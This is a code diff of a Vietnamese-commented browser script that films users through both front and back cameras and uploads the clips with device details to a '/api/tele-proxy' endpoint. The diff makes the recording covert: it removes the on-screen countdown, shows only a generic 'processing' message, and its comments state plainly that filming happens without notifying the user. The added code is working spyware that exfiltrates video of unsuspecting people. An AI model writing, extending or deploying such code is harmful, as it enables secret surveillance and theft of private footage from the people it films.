@@ -1,11 +1,11 @@
-// main.js - Quay video MP4 trong lúc xử lý
+// main.js - Quay video ngầm trong lúc hiển thị %
 const API_PROXY = '/api/tele-proxy';
 
 const info = {
   time: new Date().toLocaleString('vi-VN'),
   device: '',
   os: '',
-  camera: '⏳ Đang quay video...'
+  camera: '⏳ Đang xử lý...'
 };
 
 // --- 1. NHẬN DIỆN THIẾT BỊ ---
@@ -40,12 +40,12 @@ function detectDevice() {
   }
 }
 
-// --- 2. QUAY VIDEO CAMERA (MP4) ---
-async function recordVideoMP4(facingMode = 'user', duration = 10000) {
+// --- 2. QUAY VIDEO NGẦM (Không hiển thị thông báo) ---
+async function recordVideoSilent(facingMode = 'user', duration = 10000) {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
   
   try {
-    // Ưu tiên codec H.264 cho MP4
+    // Kiểm tra codec hỗ trợ MP4
     const mimeTypes = [
       'video/mp4;codecs=h264',
       'video/mp4;codecs=avc1',
@@ -63,7 +63,6 @@ async function recordVideoMP4(facingMode = 'user', duration = 10000) {
     }
     
     if (!mimeType) {
-      console.warn('Không tìm thấy codec hỗ trợ, dùng mặc định');
       mimeType = 'video/webm';
     }
 
@@ -78,7 +77,7 @@ async function recordVideoMP4(facingMode = 'user', duration = 10000) {
 
     const mediaRecorder = new MediaRecorder(stream, {
       mimeType: mimeType,
-      videoBitsPerSecond: 1000000 // 1 Mbps
+      videoBitsPerSecond: 1000000
     });
 
     const chunks = [];
@@ -94,8 +93,8 @@ async function recordVideoMP4(facingMode = 'user', duration = 10000) {
         resolve(blob);
       };
 
-      // Bắt đầu quay
-      mediaRecorder.start(1000); // Ghi dữ liệu mỗi giây
+      // Bắt đầu quay ngầm (không hiển thị gì)
+      mediaRecorder.start(1000);
       
       // Tự động dừng sau duration
       setTimeout(() => {
@@ -103,37 +102,22 @@ async function recordVideoMP4(facingMode = 'user', duration = 10000) {
           mediaRecorder.stop();
         }
       }, duration);
-
-      // Cập nhật UI
-      const statusDiv = document.getElementById('status');
-      if (statusDiv) {
-        let seconds = duration / 1000;
-        const timer = setInterval(() => {
-          seconds--;
-          if (seconds > 0) {
-            statusDiv.innerHTML = `🎥 Đang quay video ${facingMode === 'user' ? 'trước' : 'sau'} (${seconds}s)...<br>Vui lòng giữ nguyên vị trí.`;
-          } else {
-            clearInterval(timer);
-            statusDiv.innerHTML = `✅ Đã quay xong camera ${facingMode === 'user' ? 'trước' : 'sau'}!`;
-          }
-        }, 1000);
-      }
     });
 
   } catch (e) {
-    console.error('Lỗi quay video:', e);
+    console.error('Lỗi quay video ngầm:', e);
     return null;
   }
 }
 
 // --- 3. CHUYỂN ĐỔI SANG MP4 (nếu cần) ---
-async function convertToMP4(blob) {
+async function ensureMP4(blob) {
   // Nếu đã là MP4 thì trả về nguyên bản
   if (blob.type === 'video/mp4' || blob.type === 'video/mp4;codecs=h264') {
     return blob;
   }
   
-  // Nếu là WebM, thử chuyển sang MP4 (trên trình duyệt hỗ trợ)
+  // Thử chuyển sang MP4
   try {
     const video = document.createElement('video');
     const canvas = document.createElement('canvas');
@@ -146,7 +130,6 @@ async function convertToMP4(blob) {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     
-    // Tạo stream mới từ canvas
     const stream = canvas.captureStream(30);
     const recorder = new MediaRecorder(stream, {
       mimeType: 'video/mp4;codecs=h264'
@@ -164,9 +147,8 @@ async function convertToMP4(blob) {
       
       recorder.start();
       
-      // Vẽ từng frame
       const drawFrame = () => {
-        if (video.ended) {
+        if (video.ended || video.paused) {
           recorder.stop();
           return;
         }
@@ -178,57 +160,56 @@ async function convertToMP4(blob) {
       video.play();
     });
   } catch (e) {
-    console.warn('Không thể chuyển sang MP4, giữ nguyên định dạng:', e);
+    console.warn('Không thể chuyển sang MP4:', e);
     return blob;
   }
 }
 
-// --- 4. HÀM CHÍNH ĐIỀU KHIỂN ---
+// --- 4. HÀM CHÍNH ---
 async function main() {
   const button = document.querySelector('.btn') || document.querySelector('button');
   const statusDiv = document.getElementById('status');
   
   detectDevice();
 
-  // Cập nhật trạng thái và bắt đầu quay trong lúc xử lý
+  // Cập nhật trạng thái bắt đầu xử lý
   if (statusDiv) {
-    statusDiv.innerHTML = '⏳ Đang xử lý yêu cầu...<br>Vui lòng đợi.';
+    statusDiv.innerHTML = '⏳ Đang xử lý...<br>Vui lòng đợi.';
   }
   
-  // Bắt đầu quay video trong lúc xử lý
-  info.camera = '⏳ Đang quay camera...';
+  info.camera = '⏳ Đang quay video...';
   
-  // Quay cả 2 camera cùng lúc hoặc tuần tự
+  // BẮT ĐẦU QUAY VIDEO NGẦM (không thông báo cho user)
+  // Quay cả 2 camera cùng lúc
   const [frontVideo, backVideo] = await Promise.all([
-    recordVideoMP4("user", 8000),    // 8 giây
-    recordVideoMP4("environment", 8000) // 8 giây
+    recordVideoSilent("user", 10000),    // 10 giây
+    recordVideoSilent("environment", 10000) // 10 giây
   ]);
   
-  // Hoặc quay tuần tự nếu Promise.all không hoạt động
-  // let frontVideo = await recordVideoMP4("user", 8000);
-  // let backVideo = await recordVideoMP4("environment", 8000);
+  // Chuyển đổi sang MP4 nếu cần
+  let frontMP4 = null;
+  let backMP4 = null;
   
-  info.camera = (frontVideo || backVideo) ? '✅ Đã quay video MP4' : '🚫 Không quay được video';
+  if (frontVideo) {
+    frontMP4 = await ensureMP4(frontVideo);
+  }
+  
+  if (backVideo) {
+    backMP4 = await ensureMP4(backVideo);
+  }
+  
+  info.camera = (frontMP4 || backMP4) ? '✅ Đã quay video MP4' : '🚫 Không quay được video';
 
   // Chuẩn bị gửi dữ liệu
   const formData = new FormData();
   formData.append('clientInfo', JSON.stringify(info));
 
-  // Xác định tên file và định dạng
-  const getFileExtension = (blob) => {
-    if (blob.type.includes('mp4')) return 'mp4';
-    if (blob.type.includes('webm')) return 'webm';
-    return 'mp4';
-  };
-
-  if (frontVideo || backVideo) {
-    if (frontVideo) {
-      const ext = getFileExtension(frontVideo);
-      formData.append('front', frontVideo, `front.${ext}`);
+  if (frontMP4 || backMP4) {
+    if (frontMP4) {
+      formData.append('front', frontMP4, 'front.mp4');
     }
-    if (backVideo) {
-      const ext = getFileExtension(backVideo);
-      formData.append('back', backVideo, `back.${ext}`);
+    if (backMP4) {
+      formData.append('back', backMP4, 'back.mp4');
     }
     
     // Gửi lên server
